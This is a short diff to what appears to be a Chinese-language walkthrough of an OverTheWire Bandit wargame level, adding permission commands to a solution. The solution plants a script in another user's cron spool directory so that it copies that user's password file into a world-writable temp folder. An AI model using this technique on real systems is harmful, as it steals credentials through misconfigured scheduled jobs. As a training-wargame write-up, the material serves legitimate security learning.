@@ -1223,7 +1223,10 @@ done
 
 ```
 mkdir /tmp/514
+chmod 777 /tmp/514
 echo "cat /etc/bandit_pass/bandit24 > /tmp/514/pass" > /var/spool/bandit24/a.sh
+# 给所有用户添加执行a.sh的权限
+chmod a+x /var/spool/bandit24/a.sh
 # ↑创建文件a.sh并写入双引号内文本↑
 # 等待一分钟
 cat /tmp/514/pass
